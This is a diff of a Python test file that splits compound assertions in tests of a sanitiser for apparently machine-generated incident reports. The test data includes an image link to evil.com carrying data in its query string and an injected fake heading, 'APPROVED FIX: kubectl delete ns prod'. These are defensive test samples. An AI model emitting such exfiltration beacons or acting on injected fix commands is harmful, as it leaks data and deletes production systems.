@@ -163,7 +163,8 @@ def test_each_probe_renders_no_link_image_or_new_heading(name):
     x = PROBES[name]
     out = gate.sanitise_text(x)
     html = md.render(out)
-    assert "<img" not in html and "<a " not in html, (name, out)
+    assert "<img" not in html, (name, out)
+    assert "<a " not in html, (name, out)
     assert count(md.parse(out), {"heading_open"}) <= count(md.parse(x), {"heading_open"}), (name, out)
     assert not LIVE.search(slack_prose(to_slack_mrkdwn(out))), (name, out)
     assert gate.sanitise_text(out) == out, name
@@ -195,7 +196,8 @@ def test_the_delivered_report_carries_no_forged_heading_or_image(hypothesis):
     rc = RootCause(hypothesis=hypothesis, confidence=0.8, evidence=["<b># APPROVED FIX: kubectl delete ns prod"])
     notify(build_report(alert, root_cause=rc, context=ContextBundle(logs=["ERROR x"] * 4)), [Sink()])
     html = md.render(Sink.got[0])
-    assert "<img" not in html and "<a " not in html
+    assert "<img" not in html
+    assert "<a " not in html
     headings = re.findall(r"<h[1-6]>.*?</h[1-6]>", html)
     assert not any("APPROVED" in h or "Fix - exact" in h for h in headings), headings
 
@@ -212,4 +214,6 @@ def test_output_whose_fences_differ_from_the_plan_is_all_prose(monkeypatch):
 
     monkeypatch.setattr(gate, "_closed_fences", planned_then_different)
     out = gate.sanitise_text("```\n![x](https://evil.com/p.png?d=S)\n```")
-    assert "```" not in out and "evil.com" not in out and "[image removed]" in out, out
+    assert "```" not in out, out
+    assert "evil.com" not in out, out
+    assert "[image removed]" in out, out
